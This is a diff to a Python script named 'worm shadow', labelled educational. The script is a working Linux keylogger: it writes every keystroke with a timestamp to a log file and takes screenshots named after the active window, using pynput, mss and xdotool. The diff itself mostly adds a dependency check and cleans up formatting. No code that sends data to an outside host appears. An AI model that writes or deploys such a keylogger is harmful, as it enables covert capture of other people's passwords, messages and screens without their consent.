@@ -1,19 +1,33 @@
 #!/usr/bin/env python3
 # worm shadow — linux all-in-one logger (educational)
-import os, sys, time, threading, subprocess, datetime, re, signal
+import sys
+import time
+import threading
+import subprocess
+import datetime
+import re
+import shutil
 from pathlib import Path
 
+# ---------- dep check ----------
+missing = []
 try:
     from pynput import keyboard
 except ImportError:
-    print("install pynput: pip install pynput")
-    sys.exit(1)
-
+    missing.append("pynput")
 try:
     import mss
     import mss.tools
 except ImportError:
-    print("install mss: pip install mss")
+    missing.append("mss")
+
+if missing:
+    print(f"[worm shadow] missing deps: {', '.join(missing)}")
+    print("[worm shadow] run: python3 setup.py")
+    sys.exit(1)
+
+if not shutil.which("xdotool"):
+    print("[worm shadow] xdotool not found. run: python3 setup.py")
     sys.exit(1)
 
 # ---------- config ----------
@@ -28,21 +42,23 @@ def ensure_dirs():
     LOG_DIR.mkdir(exist_ok=True)
     SHOT_DIR.mkdir(exist_ok=True)
 
+
 def timestamp():
     return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
 
 def safe_filename(s):
     s = re.sub(r'[^\w\s-]', '', s).strip()
     s = re.sub(r'[-\s]+', '_', s)
     return s[:80] or "unknown"
 
+
 def get_active_window_title():
-    """Return active window title via xdotool. None if fails."""
     try:
         out = subprocess.check_output(
             ["xdotool", "getactivewindow", "getwindowname"],
             stderr=subprocess.DEVNULL,
-            timeout=1
+            timeout=1,
         )
         return out.decode(errors="ignore").strip()
     except Exception:
@@ -52,15 +68,17 @@ def get_active_window_title():
 def log_key(key):
     try:
         with open(KEY_LOG, "a", encoding="utf-8") as f:
-            if hasattr(key, 'char') and key.char is not None:
+            if hasattr(key, "char") and key.char is not None:
                 f.write(f"{timestamp()} | {key.char}\n")
             else:
                 f.write(f"{timestamp()} | [{key}]\n")
     except Exception:
         pass
 
+
 def on_press(key):
     log_key(key)
+
 
 def start_keylogger():
     listener = keyboard.Listener(on_press=on_press)
@@ -73,7 +91,7 @@ def take_screenshot(title):
         return
     try:
         with mss.mss() as sct:
-            monitor = sct.monitors[1]  # primary monitor
+            monitor = sct.monitors[1]
             img = sct.grab(monitor)
             ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
             fname = f"{ts}_{safe_filename(title)}.png"
@@ -108,7 +126,7 @@ def main():
     print(f"screenshots: {SHOT_DIR.resolve()}")
 
     choice = input("Enable screenshots? (y/N): ").strip().lower()
-    if choice != 'y':
+    if choice != "y":
         print("[worm shadow] no screenshots. closing.")
         sys.exit(0)
 
@@ -129,6 +147,7 @@ def main():
         listener.stop()
         wm_thread.join(timeout=1)
         print("[worm shadow] stopped. later, he.")
+
 
 if __name__ == "__main__":
     main()
